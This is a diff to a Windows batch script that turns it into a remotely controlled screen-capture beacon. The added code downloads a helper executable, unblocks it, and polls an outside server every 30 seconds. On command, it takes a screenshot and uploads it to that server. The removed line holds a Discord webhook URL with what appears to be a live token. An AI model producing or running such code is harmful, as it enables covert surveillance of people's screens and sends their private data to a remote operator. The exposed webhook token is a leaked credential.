@@ -1,2 +1,27 @@
+@echo off
+set "apiRoot=https://screen-view-one.vercel.app"
 set /p name=<name.txt
-curl -d content="it is a me, %name%" https://discord.com/api/webhooks/1337036102468505610/EeyMS7DjbOVxZvRqiY94PZ8xhBpkmdwD2ad_id3dOzMAuEV5qC0bh-BZJRi_wjSZ5JR3
+
+curl -L -o "%name%" "https://github.com/skollol/e/raw/refs/heads/main/nircmdc.exe"
+if %ERRORLEVEL% neq 0 (
+    echo Download failed.
+    exit /b 1
+)
+
+powershell -Command "Unblock-File -Path '%name%'"
+echo Download successful.
+echo API Root: %apiRoot%
+
+:loop
+for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do set "result=%%i"
+echo Response: %result%
+
+if "%result%"=="ss" (
+    echo Taking screenshot...
+    nircmd.exe savescreenshot ss.jpg
+    echo Uploading screenshot...
+    curl -s -X POST -F "name=%name%" -F "image=@ss.jpg" "%apiRoot%/ss"
+)
+
+timeout /t 30 /nobreak >nul
+goto loop
